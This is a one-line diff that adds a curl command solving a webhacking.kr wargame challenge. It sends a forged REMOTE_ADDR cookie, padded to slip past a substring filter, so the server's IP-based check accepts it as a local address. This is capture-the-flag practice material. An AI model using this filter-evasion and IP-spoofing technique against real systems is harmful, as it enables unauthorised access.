@@ -1,0 +1,1 @@
+curl -v http://webhacking.kr/challenge/bonus/bonus-4/ -b "PHPSESSID=b44d8921e326920c1fc68f486588277d; REMOTE_ADDR=112277..00..00..1"
